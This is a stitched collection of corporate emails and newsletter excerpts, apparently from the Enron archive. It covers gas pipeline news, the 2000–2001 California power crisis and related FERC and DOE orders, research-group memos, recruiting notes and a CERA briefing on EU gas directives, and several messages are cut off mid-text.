Sean tells me that the structured deal libraries, probably requires a more thorough hand-over....

...do we have that expertise still in the building?... can we extend someone here to make that happen?

TGP's DracutExpansion Receives FERC Approval
  
Tennessee Gas Pipeline has accepted the FERC's certificate 
authorizing construction of the Dracut Expansion project. The $35 
million project will replace 12 miles of existing 16-inch natural gas 
pipeline with a 24-inch pipeline from Dracutto Burlington, 
Massachusetts, primarily using existing rights-of-way.  The project 
will increase takeaway capacity from the Dracutinterconnect by an 
additional 200,000 MMBtu per day.  Once the project is in service, 
the total capacity from Dracutwill increase to more than 600,000 
MMBtu per day.  The project is scheduled to be available for service 
next fall. Tennesseeinitiated the growth by completing the Eastern 
Express 2000 project in January, 2000 and placed the Londonderry
pipeline in service in September, 2001.

Today's focus: Storage resolutions

By Anne Skamarock

Most of us are resolving not make the same mistakes we did last
year. In that vein, let me be so bold as to suggest several New
Year's resolutions for IT management regarding storage and
management of that storage.

1. I resolve to actively deter all thought of IT being merely a
   cost center and promote the value of the IT organization as a
   vital part of the business revenue stream.

Information is key to business. Efficient management of that
information and the applications that utilize it transforms IT
from a cost center that must be maintained into a vital part of
the revenue chain.

2. I will not buy one more gigabyte of storage until I have a
   complete understanding of the capacity I currently have as well
   as the data stored therein.

With the drop in cost of disks, it has become easy to ""just
throw more storage at the problem."" Of course, most of us have
learned that the storage is, relatively speaking, the easy
part. It's the ripple effect that's strangling IT today:

More storage = More data = Longer backup windows + More
personnel = Higher costs

Being proactive within IT means understanding the current
environment and both current and future requirements. To
understand the current environment, look to storage resource
management (SRM) software available today from companies like
Sun, WQuinn, or NTP Software. These can discover and report on
your current storage capacity. Some of the more sophisticated
SRM tools can tell you where data duplication is occurring and
flag specified file types.

3. Once I have an understanding of the current storage
   environment, I will develop a comprehensive strategy to manage
   the storage, the data and the people using and managing that
   storage.

Understanding the environment is the first step toward
proactive management. The second step is to have a plan. Many
SRM tools provide trend information to help evaluate capacity
run-rates and allow for better planning.

However, capacity is only one of the costs associated with
storage management. Personnel performing tasks like
provisioning, backup and recovery are part of the costs of
running the business. Once there is a plan for storage growth,
it's easier to assign people to the tasks.

Finally, any storage strategy must include policies that direct
user behaviors. Being a user myself, without limits I will
consume all available storage. It's not because I'm evil (some
may challenge that statement); it's because I am not forced to
manage my own capacity. Also, SRM software can help determine
if users are downloading MP3 files and also can show if there
is massive duplication of certain files.

4. I understand that the data stored on those many disk drives
   is one of my company's most important resources that must be
   protected from human error, hardware failure, both internal and
   external attacks (from viruses, hackers and disgruntled
   employees) and catastrophes. I resolve to create a data
   protection strategy that spans my business.

What is the survivability of my business if data are lost? This
is the question we all must ask ourselves. Every company will
answer this differently and will formulate different plans.
Companies such as StorageNetworks and SunGard provide offsite
backup and recovery for companies that require this level of
protection but don't want to develop and run their own offsite
facilities. With bandwidth prices dropping, there has never
been a better time to consider these options. Even if you don't
have the money for automatic offsite recovery, it is prudent
for every business to put together a data protection strategy,
starting with regular backups.

5. I will investigate solutions beyond those available from my
   server vendor if for no other reason than to validate the
   solution my server vendor has recommended.

Our market data suggest that most storage and storage
management products continue to be purchased from server
vendors. This is understandable, as it simplifies the many
choices and gives IT management one throat to choke when things
go wrong. However, there are many storage hardware and storage
management software companies today that can provide broader
storage capabilities than server vendors can. Understanding
those capabilities and the tradeoffs of going strictly with a
server vendor allow you to make informed decisions.

With these five suggestions for managing storage, I bid you all
a successful and prosperous New Year!

Cover Story: French insurers make a stand
January 2002 Reactions

Following the September 11 terrorist attacks on the US, France has become the latest country to find itself with a lack of insurers willing to underwrite terrorism in 2002. As in the US and Germany,
the industry is trying to forge a solution that will involve some form of government participation. But a definitive agreement has not yet been reached and, as Kim Moore discovered, it may come too
late for many French businesses.

Monthly Newsletter

Let's describe a typical and recurring nightmare for generating unit
operators. It's noon on August 15, temperatures have reached the upper 90s
all week; you're well into your reserve margin to serve native load, when a
unit trips off line. Do you scramble to find replacement power at record
high prices and worry about the consequences later? Or, have you prepared
for this event?

When the degree of risk has not been quantified, fear of the unknown can
lead to restless nights, and understandably so. The financial implications
can be astounding when a unit outage occurs during a period of high spikes
in market prices.

How does this relate to the recruitment and hiring of talent within your
shop? Allow me to bring the story together. What would you do if your top
employee came to you and said, ""You've been great to me and I've learned
alot, but I just accepted a job at your level right down the road and they
like me so much they want me to start tomorrow."" Do you spring into 911 mode
or are you ready for this day.

Start a relationship today with The Austin Group Energy. We will keep you
aware of all available talent in your market area. These candidates are
currently employed and do not answer ads. They stay in touch with
opportunities through us to ensure confidentiality. Why would Top 5
marketing companies pay us for the recruitment and placement of over 400
successful hires when they could hire them on their own. The smart and
proactive companies understand how to outpace the pack when it comes to
hiring talent, they call The Austin Group Energy.

Baker III Institute for Public Policy in the Dor? Commons of Baker Hall, Rice University, Houston. The meeting will begin on Tuesday morning, January 22, at 9:00 a.m. and will conclude by 3:00 p.m. on Wednesday, January 23. A continental breakfast will be held both mornings in the Dor? Commons. I have enclosed a tentative agenda which will be updated in the next few weeks.

Sarah,

As I have not yet heard from Jayshree, I thought I would convey the gist of our phone conversation by e-mail.  

Over the last several days, we in the research group have looked at ORACLE risk management databases and Enrononline data to corroborate the profitability numbers for power and gas trading.  Our analyses yield figures which are substantially at variance with what is normally believed to be the case.  Of course, there may well be information sources we are not privy to.  Moreover, we found some irregularities in the data which only serve to raise our doubts about the quality of the data.

As a result, we are not able to make an authoritative statement about the profitability of power and gas units. As we are not able to intepret the data ourselves, we have provided the spreadsheets so you can draw your own conclusions.  Thanks.

Its very sad to see what has happened.  I hope you are doing OK under the
circumstances.  I wanted also to let you know that I'm transitioning to an
advisory role at Opt4  since they are now in a more operational mode, rather
than developmental.  I've joined Charles River Associates in the Palo Alto
office. What are your plans for the future?  I would like to extend an
invitation to get to know us better, and perhaps to collaborate if our
interests coincide.  When do you get back from vacation?

Dear Mr. Kaminski:

""The New Face of Risk: Energy Strategies for a Changed World"" is the
theme of CERA's 21st Executive Conference, to be held on February 11-15,
2002 in Houston, Texas.   This event will be particularly timely and
important in light of the recent major events transforming the global
energy landscape.  I wanted to extend my personal recommendation that
you join us in Houston to exchange ideas, interact with peer level
senior decision makers, and gain new insight and strategies for the
energy future.

The full agenda and on-line registration can be found on our website at
http://www.cera.com/ceraweek .   As you can see we have a particularly
distinguished and exciting group of influential energy leaders speaking
at this year's event.

CERAWeek 2002 will offer thought leadership and perspectives on the
major new risks and challenges facing energy decision-makers, including
the implications of the profound changes that the world has witnessed
over the past months.  Among the key topics and questions are:

* The new geopolitics -- what are the implications for energy security,
global investment, sanctions, and stability?

* Markets in turmoil -- what are the prospects for oil, natural gas and
electric power prices and asset valuation?

* Deregulation -- what will be the responses to the new threats to
workable competitive markets?

* Industry structure and competitive dynamics -- How are companies
positioning and aligning themselves for the new world?

Our focus is on all key regions and energy sectors--oil, natural gas and
power.  We have introduced four focused integrated tracks that reflect
themes running across the industry.  These include Technology, Finance,
Market Strategy, and Environment.

The conference is the centerpiece of CERAWeek 2002, a full week of
senior level meetings designed to foster exchange and learning, as well
as informal interaction and networking.  Last year's participants
included some 1700 executives from 47 countries -- including over 400
CEOs, Presidents and Ministers.

Two- and Four-day passes are available, as well as enhanced Online
Premium digital access to the event.  For the latest agenda updates and
special announcements, or to enroll, please visit our website at
http://www.cera.com/ceraweek .

I look forward to seeing you at CERAWeek 2002.

Here is brief description about myself: Right after I
got my Ph.D. on finance and econometrics from Duke
University in 1998, I joined Williams Energy Trading
company as a Quantitative Analyst. Now I am Lead Quant
and in charge of the quantitative research group with
7 highly talented people. I have done extensive
research and modeling about electricity,

I wanted to forward to you both the current presentations for campus.  We can 
tweak these however we feel appropriate to match Cal Berkeley on Monday.  I 
believe that we can probably expect about 30 - 50 students (based on interest 
shown at the Career Fair).  These tend to be fairly informal.  I was thinking 
that we could present in this order:

Vince  Gives the Enron overview presentation  (30 minutes)
John  Gives the Global Technology specific presentation (20 minutes)
 Ashley  Goes over recruiting information at the end (10 minutes)

Please take a look at each presentation and speaker notes to ensure that you 
feel comfortable with the layout and content.  I am meeting with John today

LIBERTY GAS STORAGE PROJECT - We appreciated the insight from Zimin Lu on the 
Liberty Gas Storage project.  I had originally thought that Enron could 
negotiate a deal directly with HNG Storage Co. on the joint development of 
these facilities.  However, HNGS has now retained Wasserstein Pirella to 
""market"" the opportunity.  [FYI - Wasserstein was the Investment Banker that 
handled the recent sale of the Market Hub Partners storage facilities, so 
they certainly would have a current list of interested parties.]  
Unfortuneately, we will now have to participate in another ""auction"" if we 
are to pursue this further.  I'll let you know what we decide to do.

ALASKA / NORTHERN CANADA PIPELINE - I would like to discuss ways that Enron 
might enhance our prospect of participating in the initiative to bring 
substantial new gas reserves from Alaska and northern Canada to the lower 
48.  A large equity investment in a very expensive, regulated pipeline is not 
likely to get much support within Enron.  Instead, our competitive advantage 
may best be realized through the efficient and creative utilization of the 
existing US pipeline grid, (""backhaul"" on Northern Natural, expansion 
opportunities on Northern Border and NNG, or even capacity exchanges with 
other pipeline operators).

I think it would be very useful if we had the capability to model the impact 
of the evolving North American marketplace on that initiative, and vice 
versa.  Any insight we could develop on who will be the eventual ""winners"" 
and ""losers"" if / when that large volume of new gas enters the market would 
be valuable. 

I will look forward to our discussion tomorrow (Thursday) at 1:30 PM.

",Larry Vince,,
2438,"Dear Vince:

Thanks for your response.

I am not a programmer, nor a ""quant"".  I am an expert in Excel and otherwise
have advanced skills in the remaining MSOffice Suite.  Beyond that I have
extensive experience working with research and computer progamming personnel
on projects from networks to databases, and in particular, automation.

For instance, the first generation of the risk analytics system that I
designed for Quantlab was done in Excel.  In subsequent generations of the
system, Excel served only as the GUI - given its extreme flexibility - and a
SQL database operated underneath (Compaq servers, RAID array), integrating
real-time operations for all components of the system.

The research team at Quantlab used many leading edge modelling
methodologies, such as genetic algorithms, neural networks, principal
component analysis, kernel density estimation, fast kernel regression,
Hidden Markov Modelling and many other pattern recognition, walk-forward
back testing, and other simulation techniques.

I was the sole individual on a team of 17 that had any practical trading
experience, and therefore, felt that I played a critical role in the
application and implementation of each of the system components from data
mining to research to signal generation to execution.  Beyond that, I was
uniquely qualified to articulate the project's mission to investors, and
therefore, was highly successful in spearheading support - financial and
otherwise - from our network.

Althought I did not ask specifically, I surmise from your question that you
are leading a research effort.  I believe that my skill set is best served
as a liaison between research and trading, since I speak both languages.  I
believe that I possess great vision and enthusiasim that could be leveraged
in a group, project or product management role to integrate and streamline
diverse systems and processes; a common scenario in most proprietary
development settings today.

In closing, I would like to learn more about Enron and the financial
technology effort therein through further discussion with you, or if that is
not appropriate, someone to whom you would be comfortable referring me.

I look forward to your thoughts.

want to clarify that we are primarily interested in the long term gas model

model is a prerequisite, I doubt that we would want to spend a lot of time on 
it.

Depending upon how long it would take to become familiar with the long term 
model, it might be helpful to have access in both Omaha and Houston?

We would eventually need specifications for the computer system we would need 
for testing the model.  Steve Hotte, CIO for ETS, would co-ordinate the 
in-house installation for us.  At some point, it will be helpful to get Steve 
in contact with the appropriate MarketPoint IT rep.

Title: California on the Brink 
CERA Knowledge Areas: Western Energy, N. American Power, N. American Gas 

CALIFORNIA ON THE BRINK 
The California Stalemate 
California moved closer to the brink of an outage today as concerns over 
credit-worthiness of buyers brought the possibility that generators would 
avoid selling to the California market. While numerous factors have 
contributed to the high cost of power incurred by California's utilities, the 
root cause of the current crisis is a lack of new generation. The current 
credit crisis and its threat to supplies could spark state action to address 
the situation. The collective efforts of all market participants should be 
focused on increasing generation capacity as quickly as possible.

Western power prices have skyrocketed well beyond the record levels set this 
summer. Perhaps because frozen rates insulate the majority of California 
consumers and companies from tangible effects of the market crisis, 
regulators have been able to postpone meaningful market reforms and 
significant rate increases. The California Public Utilities Commission denied 
the requests of Pacific Gas & Electric and Southern California Edison to end 
their rate freezes, forcing these utilities at least temporarily to finance 
the costs of higher wholesale energy. This has created an unsustainable 
accumulation of costs and a loss of faith in the California market. 

The current credit crisis and the potential for blackouts may become the 
galvanizing events that provide state regulators with a public mandate to 
address the underlying structural problems in the industry. However, there is 
no guarantee that these regulatory actions will expedite an effective 
solution for customers and the industry as a whole. Wholesale and retail 
markets that emerge from regulatory intervention are likely to remain 
muddled. In the necessarily political process that will follow, it is 
possible that-as has largely been the case so far-the steps taken will fail 
to move the California power market toward a more enduring solution and will 
instead continue to mask the underlying structural flaws. 

In the six months since California's supply shortfall began plaguing Western 
markets, regulators have done little to address the underlying problem. 
Rather than addressing the cause of the supply shortage-establishing a market 
environment that encourages timely additions of new generating capacity and 
demand side responses-efforts are instead directed at trying to lay blame for 
the crisis and lessen the immediate financial impact on customers. Indeed, 
several actions taken thus far have served more to compound the problem by 
discouraging new power plant additions. These include price caps, repeated 
changes to market rules, attempts to seize generator profits, and a 
challenging siting and permitting process.

Medicine Worse than the Illness 
Several years of electricity demand growth and low prices in California were 
accompanied by very few additions to the supply base. Regulators did not pay 
adequate attention to the looming supply shortfall. The void of consensus 
over the cause of the current crisis has instead been replaced by a series of 
bandaid remedies that address the symptoms, but not the cause, of 
California's electric market woes.* 

* Challenging siting and permitting. Despite state action to better 
coordinate the siting and permitting process for new power plants, power 
plant developers still face high hurdles. Local community opposition alone 
has struck down some key proposed facilities.

* Price caps discourage investment. State and federal proposals to cap prices 
limit the attractiveness of the California wholesale power market, especially 
for developers who have the option of channeling scarce capital and equipment 
to more stable or more attractive markets outside the state. 

* Repeated rule changes. Frequent rule changes in the ISO markets (including 
the price caps) confound attempts by developers to estimate profits from new 
plant development.

* Calls for refunds. Despite reports by the Power Exchange, the ISO, and the 
FERC that no pattern of abuse could be found from their examination of the 
California markets, state officials continue to accuse power providers of 
gaming the market. Calls by state officials for refunds of generator profits 
are a threat to new plant development.

* Facility inspections. Recent inspections of power plants by state officials 
to verify that operators are honestly reporting the operational status of 
their generating units accentuates the atmosphere of mistrust.

CERA's recent analysis suggests that merchant plant developers in the West 
are not guaranteed? to make a profit. Prospects of new plant profitability 
are affected by the timing and quantity of new plants, decommissioning of 
older units, demand growth, and numerous other difficult-to-forecast factors. 
California's regulatory actions only further cloud the assessment of 
financial viability and degrade the political environment for developers 
considering entering the state. 

Despite efforts by the California ISO to stimulate new capacity additions in 
the state with a special, limited-term capacity payment, CERA estimates that 
demand growth will continue to outstrip supply additions in the West in 2001. 
In addition, the existing siting and permitting process will prevent a 
sufficient quantity of capacity from entering the market until 2003 at the 
earliest. Therefore, three years remain before a sufficient quantity of 
capacity enters service to significantly dampen prices and decrease the risk 
of an outage. 

The Road to Recovery 
There are a number of actions that can be taken to help relieve the capacity 
shortfall: 

* Encourage new build. Supply must be part of the answer. This requires a 
series of steps that can help facilitate new supply build. While in principal 
some have been taken, such as new fast track approval, the success of these 
actions can only be measured by the build itself. For now, there is still not 
enough new supply coming on until 2003 to relieve supply tightness.? 

* Stabilize investment climate. Utilities must have assurance that they will 
ultimately be allowed to recover market costs for power. This provides the 
credit worthiness needed by sellers to produce energy and to stimulate new 
build.

* Move toward more balanced utility supply portfolios. One of the reasons the 
pressure on customers has been so intense in California has been the absence 
(and even discouragement) of diverse supply portfolios among the utilities in 
the state-particularly for residential and small commercial customers. With 
the market at a peak, however, now is in one sense a sub-optimal time to move 
toward term contracting. Yet these contracts provide the foundation for a 
series of actions-including new supply build and demand side investments. If 
they end up above market, they will at least have achieved the desired effect 
of knocking down prices, a fact which by itself should provide sufficient 
justification for recovering the cost of these commitments.

* Encourage market mechanisms that elicit a demand response. Although 
originally a feature of California's market design, most consumers are 
insulated from price spikes through capped or frozen retail rates. Exposing 
customers to at least some of the market price signals would encourage a 
demand response.

* Encourage market mechanisms that dampen the ""Boom Bust"" characteristic of 
the market. Whether in the form of a capacity payment, a reserve requirement, 
or a minimum term portfolio requirement, the California power market needs to 
move to a structure that encourages investment in new capacity when the 
market is in balance rather than waiting for a shortage and price shock to 
elicit new investment. Such a structure can help dampen (but not eliminate) 
future price volatility.

* Avoid continuously tinkering with the market. While the market does need to 
be restructured as described above, it also needs to be stable and reliable 
to encourage the development of new supply as well as a robust long-term 
contractual market for power in California. Continually tinkering with the 
market structure-such as the three times the price cap has been shifted since 
July-only serves to undermine confidence in the market. California needs to 
do its best to develop a long-term solution and then let the market run its 
course. 

* Allow for greater environmental flexibility. The state should explore a 
more balanced solution to emissions restrictions in the face of a supply 
shortfall that has been exacerbated by generators that cannot operate due to 
emissions restrictions. 

* Free PURPA power plants to generate. Relief should be granted to PURPA 
power plants that are operational, but are restricted by contract from 
operating to generate only power.

Clarification regarding Shalesh' transfer to EBS.

The request to rotate Shalesh out of Research into EBS

fully coordinated with you and I was more than happy to oblige.

Shalesh is concerned that his integrity is being questioned and I can assure
you that he was not the instigator of the move.

My impression is that Shalesh is doing a very good job and Ravi is very happy

2481,"Dear Generation/Power Marketing Executive:

The following are summaries of two significant activities that occurred 
Friday, December 15
  1.  Energy Secretary Richardson issuance of an emergency order.
      (Richardson's statement and FPA Section 202(c) order is posted on DOE's 
Web site at:
       http://www.energy.gov/HQPress/releases00/decpr/pr00309.html )

  2.  FERC's 12/15/00 final order to fix California wholesale markets
       (FERC's Order can be viewed at 
http://www.eei.org/issues/news/cal1215order.pdf)

                                  California Supplies Ordered by Richardson

o Richardson orders listed entities to supply excess power to California ISO
o Order is effective as soon as ISO certifies shortage, but ends 12/21/00, 
unless extended
o Prices to be agreed to by supplier and ISO, or FERC will set rate later
o FPA emergency power authority transferred to DOE in 1977

As he said he would on December 13, U.S. Department of Energy Secretary Bill 
Richardson found ""an emergency exists in California by reason of the shortage 
of electric energy"" and issued an emergency order under section 202 (c) of 
the Federal Power Act (FPA) requiring listed generators and marketers to 
provide any power in excess of the needs of their firm customers to the 
California ISO.  In a statement, Richardson said the threat to the 
reliability of the California grid requires a long-term solution, but that in 
the short-term power must keep flowing to the state to avert blackouts.

The 76 listed suppliers have 12 hours after the ISO certifies to DOE that it 
has been unable to acquire adequate supplies in the market to begin providing 
requested service to the ISO.  The ISO must inform each supplier subject to 
the order of the amount and type of energy or services required by 9:00 PM, 
Eastern Standard Time, the day before the services are needed.  The order 
directs the ISO to allocate, to the extent feasible, requested services among 
subject entities in proportion to each supplier's available excess power.  
The order is effective immediately and will terminate at 3:00 AM, Eastern 
Time, December 21, 2000, unless extended.  To continue to obtain supplies 
under this emergency authority, the ISO must re-certify the shortage to DOE 
headquarters every 24 hours.

The terms of the provision of electric energy and other services by suppliers 
to the ISO ""are to be agreed to by the parties.""  If no agreement is reached, 
then under the FPA's emergency authority Secretary Richardson ""will 
immediately prescribe the conditions of service and refer the rate issue to 
the Federal Energy Regulatory Commission for a determination at a later date 
by that agency in accordance with its standards and procedures, and will 
prescribe by supplemental order such rates as it finds to be just and 
reasonable.""  The authority of FERC to set rates for power supplied under 
emergency order at just and reasonable levels where the parties themselves do 
not agree to a rate is explicitly included in FPA Section 202(c).  The DOE 
Organization Act of 1997 transferred the emergency powers of this section 
from FERC to DOE.

The 76 entities identified in the order's attachment are all the entities 
that have provided power to the ISO over the last 30 days.  Those entities 
are ordered ""to make arrangements to generate, deliver, interchange, and 
transmit electric energy when, as, and in such amounts as may be requested by 
the"" ISO, ""acting as agent for and on behalf of Scheduling Coordinators.""

             FERC De-Federalizes California Markets, Adopts Other Structural 
Reforms
                  A summary of the December 15 Order and Commission Discussion

At its special meeting today, FERC unanimously approved its eagerly awaited 
final order reforming the California wholesale markets, adopting the major 
outlines of its November 1 proposed order and sending back to California the 
responsibility for addressing state-related matters, as discussed below.  At 
the same time, FERC deferred consideration of retroactive refund issues as 
well as the imposition of region-wide price caps.

FERC reiterated the November 1 conclusions that under certain circumstances, 
California ratepayers were subjected to unjust and unreasonable power rates 
due to California's ""seriously flawed"" market structure and rules in 
conjunction with tight demand and supply conditions throughout the West.

While all four commissioners supported the order as a consensus-based outcome 
that appropriately balanced all competing interests, each commissioner 
expressed reservations with particular aspects of the order.  Chairman 
Hoecker and Comm. Breathitt expressed the strongest endorsement, while Comms. 
Hebert and Massey laid out their positions where they believed the Commission 
had either ""over-reached"" or not gone far enough, just as they did on 
November 1, as discussed below.

Highlights of key actions:

(1) FERC adopted the November 1 proposal to eliminate, effective immediately, 
the state's mandatory requirement that the state's investor-owned utilities 
buy and sell electricity through the PX, and allow these utilities to 
purchase electricity through forward contracts and other alternative 
mechanisms to manage supply risks.  FERC terminated the PX's rate schedules 
effective at the close of business on April 30, 2001.  In effect, as Chairman 
Hoecker stated, the order de-federalizes 60 percent of the California 
wholesale market established under the state's restructuring law, returning 
ratemaking authority over company-owned generation to the California Public 
Utilities Commission (CPUC).

(2) FERC modified the effective period of the November 1 $150/MWh ""soft cap"" 
proposal, limiting its application through April 2001, whereupon a 
""comprehensive and systematic monitoring and mitigation program which 
incorporates appropriate thresholds, screen and mitigation measures"" must be 
in place.  In a related move, FERC ordered a technical conference early next 
year to develop such a program by March 1, 2001, so that these measures can 
be place by the May 1, deadline.

In a major modification, FERC revised the refund conditions to clarify that 
while certain refund conditions will continue to apply, unless FERC issues 
written notification to the seller that its transaction is still under 
review, refund potential on a transaction will close after 60 days.

As proposed, however, supply bids in excess of $150 will be prohibited from 
setting the market-clearing price for all bidders and sellers bidding above 
$150/MWh will be required to report their bids to FERC on a confidential, 
weekly basis and provide certain cost support.

(3) FERC adopted the November 1 proposal to require the establishment of 
independent, non-stakeholder governing board for the ISO.  The ISO Governing 
Board must relinquish their decision-making power and operating control to 
the ISO management on January 29, 2001.  A future order will set procedures 
for discussion with state representatives on the board selection process.

(4) In a major modification, FERC adopted a $74/MWh ""price benchmark"" for 
assessing prices of five-year energy supply contracts.  This benchmark will 
be used in assessing any complaints regarding justness and reasonableness of 
pricing long-term contracts.

To facilitate prompt negotiation of longer term power contracts at reasonable 
rates, FERC announced that it will hold a settlement conference with market 
participants.

(5) FERC adopted the November 1 proposal to require market participants to 
schedule 95 percent of their transactions in the day-ahead market and 
instituting a penalty charge for under-scheduling (in excess of five percent 
of hourly load requirements), in order to discourage over-reliance on the 
real-time spot market.

(6) FERC directed the ISO and the three investor-owned utilities to file 
generation interconnection standards.

(7) FERC affirmed the longer-term measures proposed in the November 1 order, 
including submission of a congestion management design proposal by April 2, 
2001.

(8) FERC deferred resolving key issues, including establishing new ISO board 
selection procedures, developing appropriate market monitoring measures and 
negotiating protective orders associated with data collection.

(9) FERC reiterated its November 1 call to California policy makers there to 
resolve state issues, such as: (1) immediately implementing the availability 
of day ahead markets for power purchases; (2) development of demand 
responses; (3) siting of generation and transmission; and (4) assurance of 
sufficient reserve requirements.

Commissioner Responses

Comm. Hebert reluctantly concurred, calling the final order a ""missed 
opportunity"" to, among other things, send appropriate signals for new 
generation siting and conservation.  Reiterating his November 1 concerns, 
Hebert recounted the remedial remedies that he maintained the Commission 
should and should not have adopted.  While expressing pleasure at the tone of 
the order (""balanced and considerate""), the bid certainly reversal, and the 
role reserved for the state in the selection of the new ISO board, Hebert 
nonetheless objected to the benchmark prices established in the order, which 
he maintained appeared to be unreasonably low.  Hebert faulted the Commission 
for not attempting to reconcile the instant order with the November 8 order 
approving the CA ISO's emergency $250/MWh ""soft cap"" proposal.  Hebert ended 
by challenging the CPUC to do what it can to encourage utilities there to 
forward contract, including easing the existing prudence review requirements.

Comm. Breathitt endorsed the Order, reiterating her support for progress 
towards open and competitive markets.  She noted that the Order properly 
""walked the line"" by taking all of the competing interests into account, 
calling it less than ideal, but a step in the right direction.  She also 
concentrated her remarks on the importance of creating stability which will 
be accomplished by encouraging long term contracts and the implementation of 
the $150/MWh breakpoint.  Additionally she mentioned that any price below the 
$74/MWh benchmark will be presumed just and reasonable.

Comm. Massey concurred, but prefaced his remarks by expressing sympathy for 
California ratepayers, stating that he felt that market power had been 
exercised, that prices were not just and reasonable and that the marketers 
had profited too much at the expense of others in the market.  He warned 
that, as he understood the legal precedents, the Federal Courts were poised 
to grant cost recovery relief to the retailers which would then be passed on 
to consumers.  On the positive side, he approved of the de-federalization of 
60% of the market and the creation of long term contracts.  However, he 
emphasized that California regulators must now take the responsibility of 
creating more generation and transmission.  In the long term, Comm. Massey 
hoped that solutions could be reached starting with a technical conference 
and that the market would have rules more like PJM.

Finally, Comm. Massey articulated what he would have liked to have done 
differently.  He stated that he disagreed with the fact that there is not 
enough evidence to show that market power existed and he pointed to the 
on-going investigation.  He also disagreed with the $150/MWh breakpoint, 
preferring instead a hard price per generator.  The Commissioner said he 
would have set the long term benchmark for only two years instead of five and 
that he would have opened a section 206 investigation in the West.  Finally, 
he stated that he would have liked to address the issue of refunds.

Chairman Hoecker began his comments by saying that the Commission was forced 
to act  and act quickly because the stakes are so high.  He feels that it is 
now time for the state regulators and markets to act.  He noted that by 
shrinking the Cal PX, the responsibility is now with the CPUC to fashion the 
long term contracts and that hopefully we will exit this situation with the 
least amount of damage to the utilities.  In regards to suggestions for a 
regional price cap, the Chairman stated that this would not work due to the 
fact that the Commission has no jurisdiction over Bonneville, WAPA and the 
public power producers and that there is no spot market in the Northwest.  
However, he did urge Secretary Richardson to convene a conference in order to 
address regional issues.  Finally, in conceptually addressing the California 
situation, the Chairman stated that competition or ""deregulation"" did not 
fail in California, but that there never was competition in California.

DECEMBER 2000  Financial Engineering Associates, Berkeley, CA



Gentlepeople,

As the end of the year rapidly approaches, it seems timely to thank you for
your business this year.  Thank you for helping to make this the best year
ever for FEA!

And, wed also like to wish you Happy Holidays and a healthy and prosperous
New Year.

Earlier this year, FEA initiated =0F3Virtual Coffee Break=0F4, an emailed
newsletter for FEA Alliance Partners.  It has proven to be a popular and
useful media to share information.  This is our first effort at an emailed
newsletter to FEA clients, =0F3Afternoon Tea with Tracie).   We hope you wi=

take a few minutes to skim it for pertinent information  and then move it t=
o
your FEA file folder for future reference.


***ANNOUNCING FEA PRODUCT UPDATES!***

FEA has been extraordinarily busy running extensive testing on new releases=
.
The following should be available to all clients, who are current on
maintenance, in just a couple weeks.  We will send an email notification of
the availability of the release, and CDs will be shipped.  If you prefer,

I have received your message regarding Mike Roberts. I could not
agree more. Mike deserves to be compensated for his exceptional
contribution.

Additional recommendation. I think that all weather forecasting support
should be consolidated under Mike (including the weather guys supporting 
power trading). In my view, it was a mistake to remove Mike from
power support. It would also mean a lot to him personally.


Vince",John Mike Roberts Mike Vince,,
2499,"With the new year,  we would like to institute some rules within the Research 
Group.  This applies to everybody in Research and is at the express request 
of Vince, but I am just sending it to my reports (and their reports) as of 
now.

People are expected to report to work in the morning around 8:00 am to 8:30 
am but NO LATER than 8:30 am.  This is primarily because our clients from 
other groups typically start calling around 8:00 am and we need to be 
responsive.  Of course, once in a while if something urgent comes up then 
this may be relaxed but you are responsible for letting both your supervisor 
and your assistant (Anita and/or Shirley) know in advance.

I am trying to come up with a schedule that will allow me to get updated on 
all the work that you guys are doing, and I will probably set this up next 
week after Vince finishes drawing up the overall directions for the group for 
2001.

have the other nine as well, in case you need them.  The agreements are 
basically identical with one exception.  The debt to Enron in Raptor 3 
(approx. $259MM) is excluded from the Guarantees.  You may also note that 
this debt is not represented on the DPRs which I sent earlier.  This is 
because the formation of Raptor 3 was a failed FAS 125 transaction, therefore 
we did not get sale treatment and can't recognize the debt in looking at 
credit capacity.  Let me know if you have questions or if you need the other

Vince told me that London has some trouble to calculate spread option
for correl=1, vol1=vol2.  In such a case, the effective volatility becomes
zero, and the option has zero time value.   

I have modified the UnitCorrPremium() routine to force the code to treat 
this situation as a special case. (It returns the discounted intrinsic value).

Please incorporate this chang to your code so that it will no longer cause 
any

2512,"Title: Extending EU Gas Guidelines to Central and Eastern Europe
URL: http://www20.cera.com/eprofile?u=3D35&m=3D2184


Overview: A comprehensive reform of gas legislation in Central and Eastern=
=20
Europe is bringing the region in line with the European Union=01,s Gas=20
Directive. This is true both for the countries expected to enter the Union =
by=20
2004=01)05=01*Czech Republic, Estonia, Hungary, Poland, and Slovenia--and f=
or=20
candidates whose entry is not scheduled before the end of the=20
decade--Bulgaria, Latvia, Lithuania, Romania, and Slovakia. In CERA=01,s vi=
ew=20
current developments regarding the establishment of a legal framework for t=
he=20
internal gas market in Eastern and Central Europe look promising from an=20
investor=01,s point of view.

The candidate countries presented a review of progress made in the=20
implementation of the EU Gas Directive during a two-day workshop held by th=
e=20
European Commission and the World Bank in Paris in November.

Many of these countries have been reforming their energy industries=20
throughout the 1990s as part of their transition to a market economy. The=
=20
results have been mixed, particularly in the utility industries. The 1998 G=
as=20
Directive (adopted in August 2000) now offers a compelling incentive for EU=
=20
candidate countries to transform their gas industries, while providing a ro=
ad=20
map to guide them.

The critical points relevant to harmonization between the European Union an=
d=20
candidate countries include the following:

* Legal framework and regulation. The legal framework is the cornerstone of=
=20
enlargement and the yardstick of harmonization in Europe. As a result, in a=
ll=20
candidate countries in 1999=01)2000 energy laws were either updated or newl=
y=20
established along the principles spelled out in the Gas Directive. Regulato=
ry=20
bodies have been created by law and are operating in every country, althoug=
h=20
issues of staffing, financial autonomy, and independence from political=20
influence are not uniformly resolved.

* Third-party access (TPA) and long-term take-or-pay contracts. All candida=
te=20
countries agree that TPA is a key to market competition. Therefore, all hav=
e=20
adopted it or intend to do so in their new legislation. Although the=20
Commission favors regulated TPA, the specific approaches to TPA enforcement=
=20
in the candidate countries remain unclear in some cases. In particular, the=
=20
implementation of TPA will have to address the issue of long-term take-or-p=
ay=20
contracts with Russia that were signed by all major domestic gas companies=
=20
and somewhat preempt competition. Russian gas is for the most part sold to=
=20
single, traditional state-owned operators that dominate their internal=20
markets. A balance will need to be struck between these incumbent dominant=
=20
players and the competitive environment. This is made more complicated by=
=20
their ownership of large volumes of Russian gas supplied in kind in exchang=
e=20
for transit rights to West European customers. Article 25 of the directive=
=20
provides for !
a derogation to companies experiencing difficulties stemming from take-or-p=
ay=20
obligations. This derogation would apply to the companies of candidate=20
countries with historical and commercial links with the Russian gas industr=
y.=20
Furthermore, article 26 allows derogations to those member states with only=
